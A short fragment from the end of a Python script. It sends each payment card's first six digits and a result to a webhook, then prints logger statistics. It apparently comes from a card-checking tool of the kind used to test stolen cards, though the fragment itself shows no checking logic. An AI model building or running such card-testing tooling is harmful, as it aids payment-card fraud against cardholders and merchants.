                    send_webhook(webhook_url, {"bin": card[:6], "result": result})

    logger.print_stats()

if __name__ == "__main__":
    main()